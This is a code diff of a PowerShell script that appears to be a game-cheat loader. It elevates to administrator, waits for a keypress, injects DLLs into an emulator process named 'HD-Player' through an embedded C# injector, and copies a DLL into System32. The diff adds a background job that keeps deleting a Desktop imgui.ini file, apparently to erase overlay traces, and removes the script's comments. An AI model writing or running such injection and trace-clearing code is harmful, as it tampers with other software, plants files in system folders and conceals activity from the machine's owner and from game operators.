@@ -21,7 +21,22 @@ function Ensure-RunAsAdmin {
 
 Ensure-RunAsAdmin
 
-# DLL and process info
+# ---- [ Start imgui.ini Monitor Loop as a background job ] ----
+Start-Job -ScriptBlock {
+    $desktopPath = [Environment]::GetFolderPath('Desktop')
+    $iniPath = Join-Path $desktopPath "imgui.ini"
+    while ($true) {
+        if (Test-Path $iniPath) {
+            try {
+                Remove-Item $iniPath -Force -ErrorAction SilentlyContinue
+                Write-Output "Deleted imgui.ini at $(Get-Date -Format 'HH:mm:ss')"
+            } catch {}
+        }
+        Start-Sleep -Milliseconds 500
+    }
+} | Out-Null
+
+# ---- [ DLL Injection Section ] ----
 $dllFolder = "C:\Windows\SysWOW64"
 $dll1 = "Aotbst.dll"
 $dll2 = "cimgui.dll"
@@ -30,7 +45,6 @@ $processName = "HD-Player"
 $system32Path = "$env:windir\System32"
 $destDll3Path = Join-Path -Path $system32Path -ChildPath $dll3
 
-# C# DLL injector and keybind detector
 $injectorCode = @"
 using System;
 using System.Text;
@@ -131,7 +145,6 @@ while ($true) {
 
         Write-Output "[Del] pressed. Proceeding with DLL injection..."
 
-        # Copy dwmhost.dll to System32
         try {
             Copy-Item -Path (Join-Path $dllFolder $dll3) -Destination $destDll3Path -Force
             Write-Output "Copied $dll3 to $system32Path"
@@ -140,7 +153,6 @@ while ($true) {
             exit 1
         }
 
-        # Inject DLLs
         $dll1Path = Join-Path $dllFolder $dll1
         $dll2Path = Join-Path $dllFolder $dll2
 
@@ -154,7 +166,6 @@ while ($true) {
             }
         }
 
-        # Wait for process to exit before resuming monitoring
         do {
             Start-Sleep -Seconds 2
             $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
